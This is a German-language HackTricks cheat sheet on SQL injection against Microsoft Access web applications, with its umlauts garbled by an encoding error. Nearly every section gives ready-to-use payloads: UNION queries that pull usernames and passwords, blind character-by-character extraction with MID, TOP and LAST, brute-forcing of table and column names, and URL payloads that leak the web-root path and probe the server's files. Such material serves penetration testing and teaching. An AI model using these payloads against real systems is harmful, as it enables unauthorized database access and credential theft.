# MS Access SQL Injection

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Online-Spielplatz

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## DB-Einschr√§nkungen

### Zeichenkettenverkettung

Die Zeichenkettenverkettung ist m√∂glich mit den Zeichen `& (%26)` und `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Kommentare

In MS Access gibt es keine Kommentare, aber anscheinend ist es m√∂glich, das letzte Zeichen einer Abfrage mit einem NULL-Zeichen zu entfernen:
```sql
1' union select 1,2 from table%00
```
Wenn dies nicht funktioniert, k√∂nnten Sie immer die Syntax der Abfrage korrigieren:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Gestapelte Abfragen

Sie werden nicht unterst√ºtzt.

### LIMIT

Der **`LIMIT`** Operator **ist nicht implementiert**. Es ist jedoch m√∂glich, die Ergebnisse einer SELECT-Abfrage auf die **ersten N Tabellenzeilen mit dem `TOP` Operator** zu begrenzen. `TOP` akzeptiert als Argument eine Ganzzahl, die die Anzahl der zur√ºckzugebenden Zeilen darstellt.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Genau wie TOP k√∂nnen Sie **`LAST`** verwenden, um die **Zeilen vom Ende** zu erhalten.

## UNION-Abfragen/Unterabfragen

Bei einer SQL-Injection m√∂chten Sie normalerweise eine neue Abfrage ausf√ºhren, um Informationen aus anderen Tabellen abzurufen. MS Access erfordert immer, dass in **Unterabfragen oder zus√§tzlichen Abfragen ein `FROM` angegeben wird**.\
Wenn Sie also ein `UNION SELECT` oder `UNION ALL SELECT` oder ein `SELECT` in Klammern in einer Bedingung ausf√ºhren m√∂chten, m√ºssen Sie immer **eine `FROM` mit einem g√ºltigen Tabellennamen angeben**.\
Daher m√ºssen Sie einen **g√ºltigen Tabellennamen** kennen.
```sql
-1' UNION SELECT username,password from users%00
```
### Verkettung von Gleichheitszeichen + Teilzeichenkette

{% hint style="warning" %}
Dies erm√∂glicht es Ihnen, Werte der aktuellen Tabelle abzurufen, ohne den Tabellennamen zu kennen.
{% endhint %}

**MS Access** erlaubt eine **seltsame Syntax** wie **`'1'=2='3'='asd'=false`**. Da die SQL-Injection normalerweise in einer **`WHERE`**-Klausel stattfindet, k√∂nnen wir das ausnutzen.

Stellen Sie sich vor, Sie haben eine SQLi in einer MS Access-Datenbank und Sie wissen (oder haben geraten), dass ein **Spaltenname "username"** ist und dies das Feld ist, das Sie **abfragen** m√∂chten. Sie k√∂nnten die verschiedenen Antworten der Webanwendung √ºberpr√ºfen, wenn die Technik der verketteten Gleichheitszeichen verwendet wird, und potenziell Inhalte mit einer **booleschen Injection** unter Verwendung der **`Mid`**-Funktion abrufen, um Teilzeichenketten zu erhalten.
```sql
'=(Mid(username,1,3)='adm')='
```
Wenn Sie den **Namen der Tabelle** und **Spalte** kennen, die Sie abrufen m√∂chten, k√∂nnen Sie eine Kombination aus `Mid`, `LAST` und `TOP` verwenden, um alle Informationen √ºber eine boolean SQLi **auszulecken**:

```sql
SELECT TOP 1 MID(column, 1, 1) FROM (SELECT TOP 1 column FROM table ORDER BY column) AS table_alias UNION SELECT TOP 1 MID(column, 2, 1) FROM (SELECT TOP 1 column FROM table ORDER BY column) AS table_alias UNION SELECT TOP 1 MID(column, 3, 1) FROM (SELECT TOP 1 column FROM table ORDER BY column) AS table_alias ...
```

Dieser Angriff nutzt die Funktionen `MID` und `TOP`, um die Daten zeichenweise abzurufen. Durch die Verwendung von `LAST` k√∂nnen Sie die L√§nge der Spalte ermitteln. Durch die Kombination dieser Techniken k√∂nnen Sie alle Informationen aus der angegebenen Tabelle und Spalte abrufen.
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_F√ºhlen Sie sich frei, dies im Online-Playground zu √ºberpr√ºfen._

### Brute-Forcing von Tabellennamen

Mit der Chaining-Equals-Technik k√∂nnen Sie auch **Tabellennamen brute-forcen**, beispielsweise mit:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Sie k√∂nnen auch einen traditionelleren Weg verwenden:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_F√ºhlen Sie sich frei, dies im Online-Playground zu √ºberpr√ºfen._

* Sqlmap h√§ufige Tabellennamen: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* Es gibt eine weitere Liste unter [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing von Spaltennamen

Sie k√∂nnen **aktuelle Spaltennamen mit dem Chaining-Equals-Trick brute-forcen**, indem Sie Folgendes verwenden:
```sql
'=column_name='
```
Oder mit einer **group by**-Anweisung:
```sql
-1' GROUP BY column_name%00
```
Oder Sie k√∂nnen die Spaltennamen einer **anderen Tabelle** mit Brute-Force ermitteln:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Daten dumpen

Wir haben bereits die [**Chaining-Equals-Technik**](ms-access-sql-injection.md#chaining-equals-+-substring) besprochen, **um Daten aus der aktuellen und anderen Tabellen zu dumpen**. Aber es gibt auch andere M√∂glichkeiten:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
Kurz gesagt verwendet die Abfrage eine "if-then" Anweisung, um einen "200 OK" auszul√∂sen, wenn sie erfolgreich ist, oder einen "500 Internal Error" sonst. Durch die Verwendung des TOP 10 Operators ist es m√∂glich, die ersten zehn Ergebnisse auszuw√§hlen. Die anschlie√üende Verwendung von LAST erm√∂glicht es, nur das 10. Tupel zu ber√ºcksichtigen. Mit dem MID Operator ist es m√∂glich, einen einfachen Zeichenvergleich durchzuf√ºhren. Durch die richtige √Ñnderung des Index von MID und TOP k√∂nnen wir den Inhalt des Feldes "Benutzername" f√ºr alle Zeilen ausgeben.

### Zeitbasiert

√úberpr√ºfen Sie [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Andere interessante Funktionen

* `Mid('admin',1,1)` gibt den Teilstring ab Position 1 mit L√§nge 1 zur√ºck (Startposition ist 1)
* `LEN('1234')` gibt die L√§nge des Strings zur√ºck
* `ASC('A')` gibt den ASCII-Wert des Zeichens zur√ºck
* `CHR(65)` gibt den String vom ASCII-Wert zur√ºck
* `IIF(1=1,'a','b')` if then
* `COUNT(*)` z√§hlt die Anzahl der Elemente

## Tabellen auflisten

Von [**hier**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) aus k√∂nnen Sie eine Abfrage sehen, um Tabellennamen zu erhalten:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
Jedoch ist es sehr typisch, SQL-Injections zu finden, bei denen Sie **keinen Zugriff haben, um die Tabelle `MSysObjects` zu lesen**.

## Dateisystemzugriff

### Vollst√§ndiger Pfad des Web-Root-Verzeichnisses

Die Kenntnis des **absoluten Pfads des Web-Roots kann weitere Angriffe erleichtern**. Wenn Anwendungsfehler nicht vollst√§ndig verborgen sind, kann der Verzeichnispfad aufgedeckt werden, indem versucht wird, Daten aus einer nicht vorhandenen Datenbank auszuw√§hlen.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access antwortet mit einer **Fehlermeldung, die den vollst√§ndigen Pfad des Webverzeichnisses enth√§lt**.

### Dateien auflisten

Der folgende Angriffsvektor kann verwendet werden, um **die Existenz einer Datei im Remote-Dateisystem zu ermitteln**. Wenn die angegebene Datei existiert, l√∂st MS Access eine Fehlermeldung aus, die darauf hinweist, dass das Datenbankformat ung√ºltig ist:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Eine andere M√∂glichkeit, Dateien aufzulisten, besteht darin, **ein Datenbanktabellenelement anzugeben**. **Wenn** die angegebene **Datei existiert**, zeigt MS Access eine **Fehlermeldung zum Datenbankformat** an.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb-Dateiname erraten

Der **Datenbankdateiname (.mdb)** kann mit der folgenden Abfrage ermittelt werden:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Dabei ist **name\[i] ein .mdb-Dateiname** und **realTable eine vorhandene Tabelle** in der Datenbank. Obwohl MS Access immer eine Fehlermeldung ausl√∂st, ist es m√∂glich, zwischen einem ung√ºltigen Dateinamen und einem g√ºltigen .mdb-Dateinamen zu unterscheiden.

### .mdb-Passwortknacker

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) ist ein kostenloses Dienstprogramm, das verwendet werden kann, um das Hauptdatenbankpasswort von Microsoft Access 95/97/2000/XP oder Jet Database Engine 3.0/4.0 wiederherzustellen.

## Referenzen

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
